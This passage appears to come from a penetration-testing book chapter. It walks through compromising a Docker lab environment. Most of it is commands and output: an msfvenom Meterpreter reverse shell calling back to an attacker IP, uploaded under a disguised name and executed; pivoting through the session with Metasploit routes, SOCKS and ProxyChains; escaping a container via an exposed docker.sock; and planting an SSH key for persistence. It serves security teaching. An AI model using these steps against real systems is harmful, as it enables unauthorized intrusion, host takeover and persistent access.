reverse payload, which will connect back to our <a id="id703" class="indexterm"/>attack machine <code class="literal">192.168.1.193</code> on port <code class="literal">443</code>. MSFvenom is an application provided by MSF to generate portable malware using any of the available payloads. Traditionally, after successfully exploiting a system using one of the Metasploit modules, the first stage is executed on the target system. Since we did not use Metasploit for initial shell access, and we wish to spawn a Meterpreter session, we can generate a standalone Meterpreter reverse TCP payload for manual execution.</p><p>The <code class="literal">msfvenom</code> command allows us to specify the desired payload (<code class="literal">-p</code>), in this case <code class="literal">linux/x64/meterpreter/reverse_tcp</code>; the IP address of our attacker machine, <code class="literal">192.168.1.193</code>; the port on which the malware will connect back to us, <code class="literal">443</code>; and the format in which to save the resulting executable (<code class="literal">-f</code>). In this case, we will use the ELF binary format:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=</strong></span>
+<span class="strong"><strong>192.168.1.193 LPORT=443 -f elf &gt; /root/tools/nix64_rev443</strong></span>
+<span class="strong"><strong>No platform was selected, choosing Msf::Module::Platform::Linux from the payload</strong></span>
+<span class="strong"><strong>No Arch selected, selecting Arch: x64 from the payload</strong></span>
+<span class="strong"><strong>No encoder or badchars specified, outputting raw payload</strong></span>
+<span class="strong"><strong>Payload size: 96 bytes</strong></span>
+<span class="strong"><strong>Final size of elf file: 216 bytes</strong></span>
+</pre></div><p>This malware will be a 64-bit Linux Meterpreter <code class="literal">reverse_tcp</code> payload, which connects back to our external IP. Port <code class="literal">443</code> will increase the likelihood of success if the Docker host is sitting behind an aggressive firewall.</p><p>Before we execute the standalone freshly generated <code class="literal">malware /root/tools/nix64_rev443</code>, we have to setup a handler in Metasploit that will handle the incoming connection from the compromised host.</p><p>Back in the Metasploit console, we have to load the <code class="literal">exploit/multi/handler</code> module and configure it with the same values we gave <code class="literal">msfvenom</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf &gt; use exploit/multi/handler</strong></span>
+</pre></div><p>We will have to set the <code class="literal">PAYLOAD</code> variable to a value that matches our malware's:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(handler) &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp</strong></span>
+<span class="strong"><strong>PAYLOAD =&gt; linux/x64/meterpreter/reverse_tcp</strong></span>
+</pre></div><p>The <code class="literal">LHOST</code> and <code class="literal">LPORT</code> should<a id="id704" class="indexterm"/> also reflect what the malware was configured with, to ensure it is listening on the appropriate IP address and port:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(handler) &gt; set LHOST 192.168.1.193</strong></span>
+<span class="strong"><strong>LHOST =&gt; 192.168.1.193</strong></span>
+<span class="strong"><strong>msf exploit(handler) &gt; set LPORT 443</strong></span>
+<span class="strong"><strong>LPORT =&gt; 443</strong></span>
+</pre></div><p>Finally, we can <code class="literal">run</code> the handler module to spawn a listener and wait for incoming Meterpreter sessions:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(handler) &gt; run</strong></span>
+<span class="strong"><strong>[*] Started reverse TCP handler on 192.168.1.193:443 </strong></span>
+<span class="strong"><strong>[*] Starting the payload handler...</strong></span>
+</pre></div><p>Once that's done, we can upload and execute the reverse shell <code class="literal">nix64_rev443</code> onto the container. We can use Weevely to help us with this as well:</p><p>In the Weevely console, we can use the <code class="literal">:file_upload</code> command once again:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; :file_upload /root/tools/nix64_rev443 /tmp/update.lst</strong></span>
+<span class="strong"><strong>True</strong></span>
+</pre></div><p>With the malware safely in the target's temp folder, we have to make it an executable using <code class="literal">chmod</code>, and finally, just call it directly:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>weevely &gt; chmod +x /tmp/update.lst</strong></span>
+<span class="strong"><strong>weevely &gt; /tmp/update.lst</strong></span>
+</pre></div><p>The Metasploit handler module should have spawned a new Meterpreter session. We can confirm the reverse Meterpreter shell is functional by issuing a <code class="literal">sysinfo</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>[*] Sending stage (2854264 bytes) to 192.168.1.230</strong></span>
+<span class="strong"><strong>[*] Meterpreter session 1 opened (192.168.1.193:443 -&gt; 192.168.1.230:43558)</strong></span>
+
+<span class="strong"><strong>meterpreter &gt; sysinfo</strong></span>
+<span class="strong"><strong>Computer     : 172.18.0.4</strong></span>
+<span class="strong"><strong>OS           : Debian 8.9 (Linux 3.13.0-128-generic)</strong></span>
+<span class="strong"><strong>Architecture : x64</strong></span>
+<span class="strong"><strong>Meterpreter  : x64/linux</strong></span>
+<span class="strong"><strong>meterpreter &gt;</strong></span>
+</pre></div><p>As mentioned previously, pivoting is a technique that allows us to proxy traffic through a compromised host, and attack the internal network and beyond. Metasploit provides routing functionality, which we can use to tunnel TCP traffic from our attacker machine through the Meterpreter<a id="id705" class="indexterm"/> session.</p><p>To accomplish this, we will have to send the Meterpreter session to the background. This won't kill the connection and we will be able to configure Metasploit itself to properly route traffic through the compromised system:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>meterpreter &gt; background</strong></span>
+<span class="strong"><strong>[*] Backgrounding session 1...</strong></span>
+</pre></div><p>With the Meterpreter session patiently waiting in the background, we can add a new Metasploit route using a familiar <code class="literal">route add</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(handler) &gt; route add 172.18.0.0 255.255.0.0 1</strong></span>
+<span class="strong"><strong>[*] Route added</strong></span>
+<span class="strong"><strong>msf exploit(handler) &gt; route</strong></span>
+
+<span class="strong"><strong>IPv4 Active Routing Table</strong></span>
+<span class="strong"><strong>=========================</strong></span>
+
+<span class="strong"><strong>   Subnet             Netmask            Gateway</strong></span>
+<span class="strong"><strong>   ------             -------            -------</strong></span>
+<span class="strong"><strong>   172.18.0.0         255.255.0.0        Session 1</strong></span>
+
+<span class="strong"><strong>[*] There are currently no IPv6 routes defined.</strong></span>
+<span class="strong"><strong>msf exploit(handler) &gt; </strong></span>
+</pre></div><p>While the command looks similar to something we'd enter into a Linux prompt, this is not a typical network route. It exists only within Metasploit itself. If we were to launch an exploit from within <code class="literal">msfconsole</code> and aim it at say <code class="literal">172.18.0.1</code>, the traffic would be routed through the Meterpreter session and the exploit would succeed. Outside of Metasploit, however, a tool such as <code class="literal">wpscan</code> would fail to find the target.</p><p>To get around this limitation, we can set up a SOCKS4 proxy server using the <code class="literal">auxiliary/server/socks4a</code> module. <span class="strong"><strong>SOCKS</strong></span> is<a id="id706" class="indexterm"/> a protocol that defines a standard way to route network traffic through a proxy server. Metasploit supports running SOCKS (version 4) server and will handle incoming traffic just as any proxy server would, with a very important distinction. The Metasploit proxy, since it resides inside the MSF environment, will adhere to the MSF routing table, which we've recently modified. Any traffic we send to it will be handled according to the routes defined within. This means that we can request that the proxy forward our traffic to <code class="literal">172.168.0.0/16</code> and Metasploit will be smart enough to send that traffic through the Meterpreter session in the background.</p><p>Let's first load the <code class="literal">auxiliary/server/socks4a</code> module with the familiar <code class="literal">use</code> command inside the Metasploit console:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf exploit(handler) &gt; use auxiliary/server/socks4a </strong></span>
+<span class="strong"><strong>msf auxiliary(socks4a) &gt; show options</strong></span>
+
+<span class="strong"><strong>Module options (auxiliary/server/socks4a):</strong></span>
+
+<span class="strong"><strong>   Name     Current Setting  Required  Description</strong></span>
+<span class="strong"><strong>   ----     ---------------  --------  -----------</strong></span>
+<span class="strong"><strong>   SRVHOST  127.0.0.1        yes       The address to listen on</strong></span>
+<span class="strong"><strong>   SRVPORT  1080             yes       The port to listen on.</strong></span>
+
+
+<span class="strong"><strong>Auxiliary action:</strong></span>
+
+<span class="strong"><strong>   Name   Description</strong></span>
+<span class="strong"><strong>   ----   -----------</strong></span>
+<span class="strong"><strong>   Proxy  </strong></span>
+</pre></div><p>The module creates a SOCKS4 <a id="id707" class="indexterm"/>server listening on port <code class="literal">1080</code> by default. We really only need to listen on the local host IP address, <code class="literal">127.0.0.1</code>, since we're the only ones leveraging this proxy server. Running the auxiliary module sends the proxy server into the background, ready to accept incoming commands:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf auxiliary(socks4a) &gt; run</strong></span>
+<span class="strong"><strong>[*] Auxiliary module execution completed</strong></span>
+
+<span class="strong"><strong>[*] Starting the socks4a proxy server</strong></span>
+<span class="strong"><strong>msf auxiliary(socks4a) &gt; </strong></span>
+</pre></div><p>Kali Linux comes bundled with a tool called <span class="strong"><strong>ProxyChains</strong></span>, which we can use to force any application to push its traffic through a <a id="id708" class="indexterm"/>particular proxy. In our case, this is the proxy we've just created with Metasploit. This means that TCP network traffic, generated by applications running on our attacker machine, will effectively be forwarded to the Docker network, allowing us to run local attack tools and pivot right into the compromised network.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note83"/>Note</h3><p>ProxyChains is available on <a id="id709" class="indexterm"/>all penetration testing distros: <a class="ulink" href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a>.</p></div></div><p>The ProxyChains default<a id="id710" class="indexterm"/> proxy list can be adjusted to match the Metasploit <code class="literal">socks4a</code> module configuration using the <code class="literal">/etc/proxychains.conf</code> file.</p><p>With the Metasploit route added and the <code class="literal">socks4a</code> server running, we can pivot any connections through the Meterpreter session and into the container network from our Kali machine.</p></div>
+<div class="section" title="Container breakout"><div class="titlepage"><div><div><h1 class="title"><a id="ch13lvl1sec72"/>Container breakout</h1></div></div></div><p>We have access <a id="id711" class="indexterm"/>to the container's shell through the Meterpreter session and through that session, we can talk to other application containers hosted on the same machine. In the earlier Nmap scan of the Docker network, the <code class="literal">8022</code> service also stood out from the rest. As attackers, services with ports in the <code class="literal">8000</code> range are always interesting because underprotected development web servers can be found there. This particular port could be an exploitable web application and may give us more access than we currently have.</p><p>The Nmap scan report for the <code class="literal">content_ssh_1</code> container also had the SSH port open, but this service is typically harder to exploit, short of brute-forcing for weak credentials:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>Nmap scan report for content_ssh_1.content_default (172.18.0.2)</strong></span>
+<span class="strong"><strong>Host is up (0.00056s latency).</strong></span>
+<span class="strong"><strong>Not shown: 65534 closed ports</strong></span>
+<span class="strong"><strong>PORT     STATE SERVICE</strong></span>
+<span class="strong"><strong>22/tcp   open  ssh</strong></span>
+<span class="strong"><strong>8022/tcp open  unknown</strong></span>
+</pre></div><p>If we go back and drop into a shell on the compromised container, we can execute a quick <code class="literal">curl</code> command to view the contents of this web application. In the Metasploit console, we can interact with the Meterpreter session using the <code class="literal">sessions</code> command and passing the number <code class="literal">1</code> to the <code class="literal">-i</code> (interact) switch:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf auxiliary(socks4a) &gt; sessions -i 1</strong></span>
+<span class="strong"><strong>[*] Starting interaction with 1...</strong></span>
+
+<span class="strong"><strong>meterpreter &gt; </strong></span>
+</pre></div><p>Once back inside the Meterpreter session, we can drop further into the target container's terminal using the <code class="literal">shell</code> Meterpreter command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>meterpreter &gt; shell</strong></span>
+<span class="strong"><strong>Process 230 created.</strong></span>
+<span class="strong"><strong>Channel 16 created.</strong></span>
+</pre></div><p>We may not see the typical Linux prompt, but we can execute simple Linux terminal commands, such as <code class="literal">curl</code>, to inspect the <code class="literal">8022</code> service on the <code class="literal">172.18.0.2</code> container:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>curl -s 172.18.0.2:8022</strong></span>
+<span class="strong"><strong>&lt;!DOCTYPE html&gt;</strong></span>
+<span class="strong"><strong>&lt;html style="height:100%; !important;"&gt;</strong></span>
+<span class="strong"><strong>&lt;head&gt;</strong></span>
+<span class="strong"><strong>  &lt;title&gt;Docker-SSH&lt;/title&gt;</strong></span>
+<span class="strong"><strong>  &lt;script src="/js/jquery-1.11.3.min.js"&gt;&lt;/script&gt;</strong></span>
+<span class="strong"><strong>  &lt;script src="/js/term.js"&gt;&lt;/script&gt;</strong></span>
+<span class="strong"><strong>  &lt;link rel="stylesheet" href="/css/term.css" type="text/css" /&gt;</strong></span>
+<span class="strong"><strong>&lt;/head&gt;</strong></span>
+<span class="strong"><strong>&lt;body&gt;</strong></span>
+</pre></div><p>Fascinating! It<a id="id712" class="indexterm"/> appears that this particular container is a Docker-SSH application, which, as the name implies, provides SSH access to containers.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note84"/>Note</h3><p>Docker-SSH<a id="id713" class="indexterm"/> is available on Docker Hub and on <a class="ulink" href="https://github.com/jeroenpeeters/docker-ssh">https://github.com/jeroenpeeters/docker-ssh</a>.</p></div></div><p>We did go through a couple of steps to be able to execute the <code class="literal">curl</code> command on the target container, but we could also use ProxyChains to do the same thing, but from our attacker machine instead. The <code class="literal">curl</code> request will be proxied through the Metasploit SOCKS4 server we setup earlier and traffic will flow through the Meterpreter session, giving us access to the target one hop away:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# proxychains</strong></span>
+<span class="strong"><strong> curl -s 172.18.0.2:8022 </strong></span>
+<span class="strong"><strong>ProxyChains-3.1 (http://proxychains.sf.net)</strong></span>
+<span class="strong"><strong>|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.18.0.2:8022-&lt;&gt;&lt;&gt;-OK</strong></span>
+<span class="strong"><strong>&lt;!DOCTYPE html&gt;</strong></span>
+<span class="strong"><strong>&lt;html style="height:100%; !important;"&gt;</strong></span>
+<span class="strong"><strong>&lt;head&gt;</strong></span>
+<span class="strong"><strong>  &lt;title&gt;Docker-SSH&lt;/title&gt;</strong></span>
+<span class="strong"><strong>  &lt;script src="/js/jquery-1.11.3.min.js"&gt;&lt;/script&gt;</strong></span>
+<span class="strong"><strong>  &lt;script src="/js/term.js"&gt;&lt;/script&gt;</strong></span>
+<span class="strong"><strong>  &lt;link rel="stylesheet" href="/css/term.css" type="text/css" /&gt;</strong></span>
+<span class="strong"><strong>&lt;/head&gt;</strong></span>
+<span class="strong"><strong>&lt;body&gt;</strong></span>
+</pre></div><p>On our attack machine, we can proxy an SSH connection straight to this container and see what we're dealing with:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# proxychains ssh root@172.18.0.2</strong></span>
+<span class="strong"><strong>ProxyChains-3.1 (http://proxychains.sf.net)</strong></span>
+<span class="strong"><strong>|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.18.0.2:22-&lt;&gt;&lt;&gt;-OK</strong></span>
+<span class="strong"><strong>The authenticity of host '172.18.0.2 (172.18.0.2)' can't be established.</strong></span>
+<span class="strong"><strong>RSA key fingerprint is SHA256:ZDiL5/w1PFnaWvEKWM6N7Jzsz/FqPMM1SpLbbDUUtSQ.</strong></span>
+<span class="strong"><strong>Are you sure you want to continue connecting (yes/no)? yes</strong></span>
+<span class="strong"><strong>Warning: Permanently added '172.18.0.2' (RSA) to the list of known hosts.</strong></span>
+
+<span class="strong"><strong> ###############################################################</strong></span>
+<span class="strong"><strong> ## Docker SSH ~ Because every container should be accessible ##</strong></span>
+<span class="strong"><strong> ###############################################################</strong></span>
+<span class="strong"><strong> ## container | content_db_1                                  ##</strong></span>
+<span class="strong"><strong> ###############################################################</strong></span>
+
+
+<span class="strong"><strong>/ $ </strong></span>
+</pre></div><p>It looks like we were<a id="id714" class="indexterm"/> connected automatically without being prompted for a password. It also appears that we are running as <code class="literal">root</code> in this particular container:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>/ $ id</strong></span>
+<span class="strong"><strong>uid=0(root) gid=0(root) groups=0(root)</strong></span>
+<span class="strong"><strong>/ $ </strong></span>
+</pre></div><p>Neat. Docker-SSH has a few authentication configuration options and this instance of Docker-SSH appears to have been configured with the <code class="literal">noAuth</code> parameter, which allows anonymous connections.</p><p>You may be thinking that it is highly unlikely that any organization would deploy this type of container in their production environment. In reality, it is quite common for developers to spawn insecurely configured containers, such as Docker-SSH, in order to troubleshoot issues. Depending on the impact, incident responders' top priority is to restore services. Normal change management processes are bypassed and Docker-SSH deployment is greenlit. The issue is fixed and the chaos subsides, but after the engineer has put in 40 odd hours straight, mistakes happen. Insecure containers, tools, and backups are left online, ready to be misused by attackers.</p><p>If we browse the filesystem of the Docker-SSH container, we notice an interesting file in <code class="literal">/var/run</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>/ $ /bin/bash </strong></span>
+<span class="strong"><strong>root@13f0a3bb2706:/# ls -lah /var/run/docker.sock</strong></span>
+<span class="strong"><strong>srw-rw---- 1 root mysql 0 Aug 20 14:08 /var/run/docker.sock</strong></span>
+</pre></div><p>The exposed <code class="literal">docker.sock</code> file provides a way for containers to issue commands to the Docker daemon running on the host. With root access to the container, we can do all sorts of interesting things. Notably, we can communicate with the host and ask it politely to give us access to the root filesystem. This feature actually does have use in the real world. There are application containers that manage other containers on the same box. In these types of deployments, the Docker daemon running on the host must expose <code class="literal">docker.sock</code> in order for that particular container to be able to do its job.</p><p>Remember that <a id="id715" class="indexterm"/>containers are generally minimalistic and common Unix tools may not be available. We need the Docker client installed inside this container in order to easily issue commands to the Docker host. To quickly install the Docker client, we can use the bash script provided by <a class="ulink" href="http://get.docker.com">get.docker.com</a>. This is the official shell script from Docker that sets up the environment, resolves dependencies, and makes sure the Docker client installs successfully.</p><p>We can easily upload the Docker install bash script from <a class="ulink" href="http://get.docker.com">get.docker.com</a> using <code class="literal">proxychains</code> and <code class="literal">scp</code>. In a separate terminal on the attacker machine, we use <code class="literal">wget</code> to download the script and save it locally. We then wrap a <code class="literal">scp</code> (Secure Copy) command with <code class="literal">proxychains</code> and upload the script to the target container:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wget https://get.docker.com -O /root/tools/docker-install.sh</strong></span>
+<span class="strong"><strong>root@kali:~# proxychains scp </strong></span>
+<span class="strong"><strong>/root/tools/docker-install.sh root@172.18.0.2:/tmp/update.sh</strong></span>
+<span class="strong"><strong>ProxyChains-3.1 (http://proxychains.sf.net)</strong></span>
+<span class="strong"><strong>|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.18.0.2:22-&lt;&gt;&lt;&gt;-OK</strong></span>
+<span class="strong"><strong>update.sh    100%    14K    00:00</strong></span>
+<span class="strong"><strong>root@kali:~#</strong></span>
+</pre></div><p>Back in the Docker-SSH container terminal, we can execute the Docker install script using <code class="literal">bash</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@13f0a3bb2706:/# bash /tmp/update.sh</strong></span>
+<span class="strong"><strong># Executing docker install script, commit: 49ee7c1</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+</pre></div><p>Once we have the Docker client binary, we can talk to our gracious host and ask it to create another container with the host filesystem mounted inside, with the following <code class="literal">docker run</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@13f0a3bb2706:/# docker run -iv /:/host ubuntu:latest /bin/bash</strong></span>
+<span class="strong"><strong>Unable to find image 'ubuntu:latest' locally</strong></span>
+<span class="strong"><strong>latest: Pulling from library/ubuntu</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>Status: Downloaded newer image for ubuntu:latest</strong></span>
+<span class="strong"><strong>root@a39621d553e4:/#</strong></span>
+</pre></div><p>What we've done here is created a new Ubuntu container instance from within the Docker-SSH container. The <code class="literal">-v</code> option will mount the host root filesystem to the new container's <code class="literal">/host</code> folder with read-write privileges. The Docker client will also spawn a <code class="literal">/bin/bash</code> shell when this new container is up and running, and the <code class="literal">-i</code> switch makes sure that Docker does not drop the container into the background (daemonize), and we have an interactive session. In other words, we have a root shell on a new Ubuntu container.</p><p>This is all made <a id="id716" class="indexterm"/>possible by the exposed Docker socket found in the <code class="literal">/var/run/docker.sock</code>. The Docker client used this special file to communicate with the Docker host API and issue arbitrary commands.</p><p>Inside this newly spawned Ubuntu container, we can observe the mounted host filesystem:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@a39621d553e4:/# ls -lah / </strong></span>
+<span class="strong"><strong>total 76K</strong></span>
+<span class="strong"><strong>drwxr-xr-x  35 root root 4.0K Oct  7 01:38 .</strong></span>
+<span class="strong"><strong>drwxr-xr-x  35 root root 4.0K Oct  7 01:38 ..</strong></span>
+<span class="strong"><strong>-rwxr-xr-x   1 root root    0 Oct  7 01:38 .dockerenv</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>drwxr-xr-x   2 root root 4.0K Oct  7 01:38 home</strong></span>
+<span class="strong"><strong>drwxr-xr-x  22 root root 4.0K Aug 20 14:11 host</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>drwx------   2 root root 4.0K Oct  7 01:38 root</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>root@a39621d553e4:/# </strong></span>
+</pre></div><p>With read-write privileges to this directory, we can quickly compromise the host itself with the help of <code class="literal">chroot</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@33f559573304:/# chroot /host</strong></span>
+<span class="strong"><strong># /bin/bash</strong></span>
+<span class="strong"><strong>root@33f559573304:/#</strong></span>
+</pre></div><p>If you recall, the <code class="literal">chroot</code> functionality resets the effective filesystem root to an arbitrary directory. In this case, the arbitrary directory happens to be the host's root file system. If we issue another <code class="literal">ps</code> command within the <code class="literal">chroot /host</code> directory, the output is slightly different from before:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@33f559573304:/# ps x</strong></span>
+<span class="strong"><strong>  PID TTY      STAT   TIME COMMAND</strong></span>
+<span class="strong"><strong>    1 ?        Ss     0:04 /sbin/init</strong></span>
+<span class="strong"><strong>    [...]</strong></span>
+<span class="strong"><strong>  751 ?        Ssl    1:03 /usr/bin/dockerd --raw-logs</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>14966 ?        R+     0:00 ps x</strong></span>
+</pre></div><p>It appears that we're not in Kansas anymore! You'll notice the process listing shows <code class="literal">dockerd</code> running, as well as <code class="literal">init</code> with <code class="literal">PID 1</code>. This is a process listing of the Docker host.</p><p>We'll need to persist our access in case we lose connectivity to the Docker containers. The easiest way is to generate a new SSH authentication key pair and add the public key to the <code class="literal">authorized_keys</code> file.</p><p>The attacker machine <code class="literal">ssh-keygen</code> can be used to generate a new RSA keypair:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# ssh-keygen -t rsa -b 4096 -C "sensible@ansible"</strong></span>
+<span class="strong"><strong>Generating public/private rsa key pair.</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>SHA256:mh9JYngbgkVsCy35fNeAO0z0kUcjMaJ8wvpJYiONp3M sensible@ansible</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>root@kali:~#</strong></span>
+</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note85"/>Note</h3><p>Remember the ROE and remove any artifacts, such as authorized SSH keys, once the engagement has completed.</p></div></div><p>Back inside the <a id="id717" class="indexterm"/>container, we can append our key to the Docker host's <code class="literal">authorized_keys</code> file, granting us root access through SSH public key authentication:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@33f559573304:/# echo "ssh-rsa VGhlcmUgYXJlIHRoZXNlIHR3byB5b3VuZyBmaXNoIHN3aW1taW5nIGFsb25nLCBhbmQgdGhleSBoYXBwZW4gdG8gbWVldCBhbiBvbGRlciBmaXNoIHN3aW1taW5nIHRoZSBvdGhlciB3YXksIHdobyBub2RzIGF0IHRoZW0gYW5kIHNheXMsICJNb3JuaW5nLCBib3lzLCBob3cncyB0aGUgd2F0ZXI/IiBBbmQgdGhlIHR3byB5b3VuZyBmaXNoIHN3aW0gb24gZm9yIGEgYml0LCBhbmQgdGhlbiBldmVudHVhbGx5IG9uZSBvZiB0aGVtIGxvb2tzIG92ZXIgYXQgdGhlIG90aGVyIGFuZCBnb2VzLCAiV2hhdCB0aGUgaGVsbCBpcyB3YXRlcj8gIg==sensible@ansible" &gt;&gt; /host/root/.ssh/authorized_keys</strong></span>
+</pre></div><p>From our attack box, we can pivot through our Meterpreter session, get inside the container network, and authenticate to the SSH service of <code class="literal">172.18.0.1</code>, which we've previously suspected, based on <code class="literal">nmap</code> results, belongs to the host:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# proxychains ssh root@172.18.0.1 -i ~/.ssh/id_rsa</strong></span>
+<span class="strong"><strong>ProxyChains-3.1 (http://proxychains.sf.net)</strong></span>
+<span class="strong"><strong>|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-172.18.0.1:22-&lt;&gt;&lt;&gt;-OK</strong></span>
+<span class="strong"><strong>Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-128-generic x86_64)</strong></span>
+
+<span class="strong"><strong>root@vulndocker</strong></span>
+<span class="strong"><strong>:~# id</strong></span>
+<span class="strong"><strong>u</strong></span>
+<span class="strong"><strong>id=0(root) gid=0(root) groups=0(root)</strong></span>
+</pre></div></div>
+<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch13lvl1sec73"/>Summary</h1></div></div></div><p>Container technology has many benefits, which makes it an important topic. Docker is revolutionary in the way it handles container images and deployment. As attackers, we have to look at all new technology with the hacker mindset. How can we break it and how can we use it to gain access that we didn't have before?</p><p>If a business switches from VMs to containers in the hope of reducing costs, while assuming they provide the same protection, the company is exposing itself to cross-application attacks that were difficult, if not impossible, before.</p><p>In this chapter, we saw how compromising a simple containerized CMS led to access to another container, which eventually resulted in full compromise of the host. This is not to say that Docker and container technology should be avoided, but just like any other software, Docker must be configured securely before deployment. A vulnerable or improperly configured container could allow attackers to pivot to other more sensitive applications, or worse, the host.</p><p>We also looked at the perils of deploying applications using insecure container networks. We were able to compromise an application and once inside, we successfully pivoted around the Docker network, gaining access to other containers, and ultimately compromising the host itself.</p></div></body></html>
